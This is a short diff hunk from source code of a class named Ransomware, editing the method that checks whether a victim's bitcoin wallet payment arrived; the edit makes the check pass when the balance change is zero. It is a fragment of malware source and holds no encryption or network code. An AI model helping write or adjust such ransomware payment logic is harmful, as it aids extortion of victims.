@@ -121,7 +121,7 @@ class Ransomware:
         current_balance = self.get_balance(wallet_address)
         change = current_balance - initial_balance
         
-        if (change == bitcoin_needed):
+        if (change == 0):
             return True
         else:
             return False
